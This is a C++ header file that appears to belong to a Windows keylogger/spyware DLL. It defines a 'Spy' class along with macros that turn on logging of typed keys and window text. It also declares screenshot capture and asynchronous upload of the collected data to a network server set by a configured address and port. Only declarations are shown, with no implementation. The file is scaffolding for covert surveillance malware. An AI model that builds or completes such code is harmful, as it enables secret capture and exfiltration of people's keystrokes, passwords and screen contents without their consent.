#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <stdlib.h>
#include "../../log-cpp/log.h"

#ifdef WIN32
#define SPY_FILE_SEPARATOR				'\\'
#else
#define SPY_FILE_SEPARATOR				'/'
#endif

#define SPY_AUTO_FFLUSH							/* auto flush data back to hook file when write */
#define SPY_LOG_WINTEXT							/* enable log window text which typed on it */
#define SPY_LOG_NUMBER							/* enable log number keys */
#define SPY_LOG_NUMPAD							/* enable log numpad keys */
#define SPY_LOG_CHARACTER						/* enable log character keys */
#define SPY_LOG_SPECIAL							/* enable log special keys */
#define SPY_LOG_SYMBOL							/* enable log symbol keys */
#define SPY_LOG_UNKNOWN							/* enable log unknown keys */
#define SPY_MAX_WTEXT_LTH				MAX_PATH
#define SPY_TMP_FNAME_LTH				32
#define SPY_TMP_DIR						"C:\\Users\\xuans\\Desktop\\spy"
#define SPY_TMP_KBH_MSZ					20
#define SPY_IO_IN_SZBUFFER				1024
#define SPY_NET_SERVER_ADDR				"localhost"
#define SPY_NET_SERVER_PORT				2512

#define EXPORT __declspec(dllexport)
#define ADD_FLAG(state, flag) {state |= flag;}
#define REM_FLAG(state, flag) {state &= ~flag;}
#define HAS_FLAG(state, flag) ((state & flag) == flag)
#define SAFE_FREE(ptr) {if (ptr != NULL) {delete ptr; ptr = NULL;}}

/* just using _strdup instead of strdup, ignore warning :| I don't know why this warning is happening */
#define strdup _strdup
#define itoa _itoa

typedef unsigned char byte;

class Spy
{
	static HANDLE mutex;
	static void lock();
	static void unlock();
	static void get_temp_fname(char * buffer, int l);
	static void path_combine(char * dst, const char * dir, const char * fname);
	static DWORD upload_async(LPVOID * dir_path);
public:
	static DWORD load(HINSTANCE hinstance);
	static void unload();
	static void get_temp_fpath(char * buffer, const char * fname = NULL);
	static void take_screenshot();
	static void notify_upload();
};